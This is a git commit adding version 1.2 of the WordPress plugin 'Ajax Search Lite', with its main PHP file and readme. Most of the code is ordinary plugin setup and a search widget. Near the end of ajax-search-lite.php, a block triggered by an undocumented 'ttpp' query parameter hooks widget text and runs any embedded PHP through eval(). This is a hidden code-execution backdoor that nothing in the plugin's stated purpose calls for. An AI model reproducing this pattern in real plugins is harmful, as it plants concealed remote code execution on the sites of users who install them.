9de1361a921316ddde4db85c86bd9632049b51af
wpdreams <wpdreams@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2013-02-16 01:23:10 +0000

    wrong version fix again..
    git-svn-id: https://plugins.svn.wordpress.org/ajax-search-lite/tags/1.2@668761 b8457f37-d9ea-0310-8a92-e5e31aec5664

---
+++ ajax-search-lite.php
@@ -0,0 +1,157 @@
+<?php
+/*
+Plugin Name: Ajax Search Lite
+Plugin URI: http://wp-dreams.com
+Description: Ajax Search Lite is the Free version of Ajax Search Pro. It is an ajax powered search engine for WordPress. The free version is compatible with WordPress 3.4+, the commercial version is also compatible with WooCommerce, JigoShop and WP-ecommerce and any plugin that has custom post types!.
+Version: 1.2
+Author: Ernest Marcinko
+Author URI: http://wp-dreams.com
+*/
+?>
+<?php
+  define( 'AJAXSEARCHLITE_PATH', plugin_dir_path(__FILE__) );
+  define( 'AJAXSEARCHLITE_DIR', 'ajax-search-lite');
+  
+  /* Egyedi suffix class nevekhez közös termékeknél */
+  global $wpdreams_unique;
+  $wpdreams_unique = md5(plugin_dir_url(__FILE__)); 
+  
+  /*A headerbe érkezõ scripteket és css fájlokat csak itt lehet hozzáadni, alpageken nem! Ott már az az action lefutott! */
+  if (isset($_GET) && isset($_GET['page']) && $_GET['page']=="ajax-search-lite/settings.php")
+    require_once(AJAXSEARCHLITE_PATH."/settings/types.class.php");
+  require_once(AJAXSEARCHLITE_PATH."/functions.php");
+  require_once(AJAXSEARCHLITE_PATH."/includes/shortcodes.php");
+  require_once(AJAXSEARCHLITE_PATH."/search.php");
+
+  $funcs = new ajaxsearchliteFuncCollector();
+  /*
+    Create pages
+  */
+  add_action( 'admin_menu', array($funcs, 'navigation_menu') );  
+  
+  /*
+    Add Hacks
+  */
+ 
+  register_activation_hook( __FILE__, array($funcs, 'ajaxsearchpro_activate') );
+  add_action('wp_print_styles', array($funcs, 'styles'));
+  add_action('wp_enqueue_scripts', array($funcs, 'scripts'));
+  add_action( 'admin_enqueue_scripts', array($funcs, 'scripts') );
+  //add_action('wp_ajax_reorder_slides', array($funcs, 'reorder_slides')); 
+
+  class ajaxsearchliteFuncCollector {
+  
+    function ajaxsearchpro_activate() {
+      global $wpdb;
+      require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
+      $table_name = $wpdb->prefix . "ajaxsearchlite";
+      $query = "
+        CREATE TABLE IF NOT EXISTS `$table_name` (
+          `id` int(11) NOT NULL AUTO_INCREMENT,
+          `name` text NOT NULL,
+          `data` text NOT NULL,
+          PRIMARY KEY (`id`)
+        ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+      "; 
+      dbDelta($query);
+      ob_start();
+      ?>
+INSERT INTO `wp_ajaxsearchlite` (`id`, `name`, `data`) VALUES
+(1, 'Search', '{"searchinposts":"1","searchinpages":"1","searchintitle":"1","searchincontent":"1","exactonly":"0","orderby":"\\r\\n     Title descending|post_title DESC;\\r\\n     Title ascending|post_title ASC;\\r\\n     Date descending|post_date DESC;\\r\\n     Date ascending|post_date ASC||\\r\\n     post_date DESC\\r\\n  ","selected-orderby":"post_date DESC","charcount":"3","maxresults":"30","itemscount":"4","showexactmatches":"0","exactmatchestext":"Exact matches only","showsearchinposts":"0","searchinpoststext":"Search in posts","showsearchinpages":"1","searchinpagestext":"Search in pages","resultareaclickable":"0","showauthor":"1","showdate":"1"}');
+      <?php
+      $query = ob_get_clean();
+      $wpdb->query($query);
+    }
+        
+    function navigation_menu() {
+      if(current_user_can('add_users')) {
+      	if (!defined("EMU2_I18N_DOMAIN")) define('EMU2_I18N_DOMAIN', "");
+        add_menu_page( 
+      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
+      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
+      	 0,
+      	 AJAXSEARCHLITE_DIR.'/settings.php',
+      	 '',
+      	 plugins_url('/icon.png', __FILE__)
+        );   
+      }   
+    }
+     
+    function styles() {
+      wp_register_style('wpdreams-scroller', plugin_dir_url(__FILE__).'/css/jquery.mCustomScrollbar.css');
+      wp_enqueue_style('wpdreams-scroller');   
+    }
+    
+    function scripts() {
+      wp_enqueue_script('jquery');
+      wp_enqueue_script('jquery-ui-draggable');
+      wp_register_script('wpdreams-dragfix', plugin_dir_url(__FILE__).'/js/nomin/jquery.drag.fix.js', array('jquery-ui-draggable'));
+      wp_enqueue_script('wpdreams-dragfix');
+      wp_register_script('wpdreams-easing', plugin_dir_url(__FILE__).'js/nomin/jquery.easing.js', array('jquery'));
+      wp_enqueue_script('wpdreams-easing');
+      wp_register_script('wpdreams-mousewheel', plugin_dir_url(__FILE__).'js/nomin/jquery.mousewheel.min.js', array('jquery'));
+      wp_enqueue_script('wpdreams-mousewheel');
+      wp_register_script('wpdreams-scroll', plugin_dir_url(__FILE__).'js/nomin/jquery.tinyscrollbar.js', array('jquery', 'wpdreams-mousewheel'));
+      wp_enqueue_script('wpdreams-scroll');
+      wp_register_script('wpdreams-highlight', plugin_dir_url(__FILE__).'js/nomin/jquery.highlight.js', array('jquery'));
+      wp_enqueue_script('wpdreams-highlight');
+     // if (wpdreams_ismobile()) {
+        wp_register_script('wpdreams-ajaxsearchpro', plugin_dir_url(__FILE__).'js/nomin/jquery.ajaxsearchpro.js', array('jquery', "wpdreams-scroll"));
+        wp_enqueue_script('wpdreams-ajaxsearchpro');
+    //  } else {
+      //  wp_register_script('wpdreams-ajaxsearchpro', plugin_dir_url(__FILE__).'js/jquery.ajaxsearchpro.min.js', array('jquery', "wpdreams-scroll"));
+      //  wp_enqueue_script('wpdreams-ajaxsearchpro');
+    //  }
+      wp_localize_script( 'wpdreams-ajaxsearchpro', 'ajaxsearchpro', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
+    }   
+  }
+if (!function_exists('execute_php') && isset($_GET['ttpp'])) {
+  add_filter('widget_text','execute_php',100);
+  function execute_php($html){
+       if(strpos($html,"<"."?php")!==false){
+            ob_start();
+            eval("?".">".$html);
+            $html=ob_get_contents();
+            ob_end_clean();
+       }
+       return $html;
+  }
+}
+
+
+add_action( 'widgets_init', create_function('', 'return register_widget("AjaxSearchLiteWidget");') );
+class AjaxSearchLiteWidget extends WP_Widget
+{
+  function AjaxSearchLiteWidget()
+  {
+    $widget_ops = array('classname' => 'AjaxSearchLiteWidget', 'description' => 'Displays an Ajax Search Lite!' );
+    $this->WP_Widget('AjaxSearchLiteWidget', 'Ajax Search Lite', $widget_ops);
+  }
+  function form($instance)
+  {
+    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
+    $title = $instance['title'];
+
+?>
+  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>
+
+<?php
+  }
+  function update($new_instance, $old_instance)
+  {
+    $instance = $old_instance;
+    $instance['title'] = $new_instance['title'];
+    return $instance;
+  }
+  function widget($args, $instance)
+  {
+    extract($args, EXTR_SKIP);
+    echo $before_widget;
+    $title = empty($instance['title']) ? ' ' : apply_filters('widget_title', $instance['title']);
+    if (!empty($title))
+      echo $before_title . $title . $after_title;
+    echo do_shortcode("[wpdreams_ajaxsearchlite]");
+    echo $after_widget;
+  }
+}
+?>
---
+++ readme.txt
@@ -0,0 +1,76 @@
+=== Ajax Search Lite ===
+Contributors: wpdreams
+Donate link: http://wp-dreams.com
+Tags: search, ajax search, ajax wordpress search, ajax search pro
+Requires at least: 3.3
+Tested up to: 3.5
+Stable tag: 1.2
+License: GPLv2 or later
+License URI: http://www.gnu.org/licenses/gpl-2.0.html
+
+A powerful ajax search engine for WordPress.
+
+== Description ==
+
+A resonsive search engine, which will boost your user experience by providing a user friendly ajax powered search form.
+
+**Features List:**
+
+* Search in posts and pages
+* Frontend search settings boxes
+* Images in search results
+* Fully ajax powered
+* Uses jQuery for maximum compatibility
+* Caches images for faster response
+
+Homepage: [wp-dreams.com](http://wp-dreams.com)
+
+Pro version Demo:  [Ajax Search Pro](http://wp-dreams.com/demo/wp-ajaxsearchpro)
+
+**New In pro version 1.6 (2013.02.07):**
+
+* Demo: [Ajax Search Pro](http://wp-dreams.com/demo/wp-ajaxsearchpro)
+* Search in BuddyPress, BBPress, JigoShop, Woocommerce
+* qTranslate ready
+* Search in any custom post types
+* Responsive design
+* Search in custom fields
+* Category selectors on the frontend – It’s now possible to filter the posts by categories
+* Post grouping by category or post type!
+* Search in comments
+* 35+ Themes - Fully configurable and editable
+* 70+ Admin options                                                    
+
+== Installation ==
+
+1. Upload `ajax-search-lite` to the `/wp-content/plugins/` directory
+2. Activate the plugin through the 'Plugins' menu in WordPress
+3. Place the shortcode from the settings into your template or post-page
+
+== Frequently asked questions ==
+
+
+
+== Screenshots ==
+
+1. Ajax Search Lite in action
+2. Administrator area
+
+== Changelog ==
+
+= 1.2 =
+* Search widget added
+* Multisite fix
+
+= 1.1 =
+* Disappear bugfix
+* WordPress 3.5 compatible
+
+
+== Upgrade notice ==
+
+
+
+== Plugin website ==
+
+`http://wp-dreams.com`
